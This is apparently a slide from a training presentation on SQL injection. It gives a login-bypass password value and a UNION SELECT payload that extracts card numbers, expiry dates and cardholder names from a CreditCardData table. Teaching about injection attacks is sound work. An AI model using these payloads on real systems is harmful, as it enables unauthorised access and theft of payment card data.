@@ -1,0 +1,15 @@
+By:
+.com
+presentationgo.com
+© presentationgo.com
+SQL Injection (VII) Example 3:
+• (Step 1) The attacker could log into the website by giving the following values in the
+input fields:
+• Username: admin
+• Password: ` OR 1=1 --
+• (Step 2) Now we are going to modify the password value to fetch data from
+CreditCardData table.
+• Let’s leave the username field empty:
+• Username:
+• Password: 'UNION SELECT SUBSTRING((SELECT ',' + s.[CardNumber] + ';' + s.[Expiry] +
+';' + s.[Name] FROM dbo.[CreditCardData] s FOR XML PATH('')),2,200000)--
